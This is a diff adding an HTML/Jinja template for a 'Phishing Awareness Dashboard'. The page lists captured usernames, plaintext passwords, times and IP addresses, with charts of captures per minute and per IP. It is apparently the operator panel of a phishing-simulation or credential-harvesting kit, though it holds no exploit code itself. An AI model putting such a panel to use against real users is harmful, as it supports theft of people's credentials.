@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phishing Dashboard</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial;
+            background: linear-gradient(to right, #0f172a, #1e3a8a);
+            color: white;
+        }
+
+        h1 {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 85%;
+            margin: auto;
+            text-align: center;
+        }
+
+        .card {
+            background: #1e293b;
+            padding: 20px;
+            border-radius: 10px;
+            width: 250px;
+            margin: 20px auto;
+        }
+
+        table {
+            width: 100%;
+            margin-top: 20px;
+            background: white;
+            color: black;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: #2563eb;
+            color: white;
+            padding: 10px;
+        }
+
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        canvas {
+            margin-top: 40px;
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+<h1>🔐 Phishing Awareness Dashboard</h1>
+
+<div class="container">
+
+    <div class="card">
+        <h3>Total Captured</h3>
+        <h2>{{ data|length }}</h2>
+    </div>
+
+    <!-- TABLE -->
+    <table>
+        <tr>
+            <th>Username</th>
+            <th>Password</th>
+            <th>Time</th>
+            <th>IP</th>
+        </tr>
+
+        {% for row in data %}
+        <tr>
+            <td>{{ row[0] }}</td>
+            <td>{{ row[1] }}</td>
+            <td>{{ row[2] }}</td>
+            <td>{{ row[3] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+
+    <!-- BAR CHART -->
+    <canvas id="barChart"></canvas>
+
+    <!-- PIE CHART -->
+    <canvas id="pieChart"></canvas>
+
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    let rawData = {{ data | tojson }};
+
+    // BAR CHART (TIME)
+    let timeCounts = {};
+
+    rawData.forEach(row => {
+        let time = row[2].substring(0, 16);
+
+        if (timeCounts[time]) {
+            timeCounts[time]++;
+        } else {
+            timeCounts[time] = 1;
+        }
+    });
+
+    new Chart(document.getElementById("barChart"), {
+        type: 'bar',
+        data: {
+            labels: Object.keys(timeCounts),
+            datasets: [{
+                label: "Users per Minute",
+                data: Object.values(timeCounts),
+                backgroundColor: "#3b82f6"
+            }]
+        }
+    });
+
+    // PIE CHART (IP)
+    let ipCounts = {};
+
+    rawData.forEach(row => {
+        let ip = row[3];
+
+        if (ipCounts[ip]) {
+            ipCounts[ip]++;
+        } else {
+            ipCounts[ip] = 1;
+        }
+    });
+
+    new Chart(document.getElementById("pieChart"), {
+        type: 'pie',
+        data: {
+            labels: Object.keys(ipCounts),
+            datasets: [{
+                data: Object.values(ipCounts),
+                backgroundColor: [
+                    "#3b82f6", "#10b981", "#f59e0b",
+                    "#ef4444", "#8b5cf6", "#14b8a6"
+                ]
+            }]
+        }
+    });
+
+});
+</script>
+
+</body>
+</html>
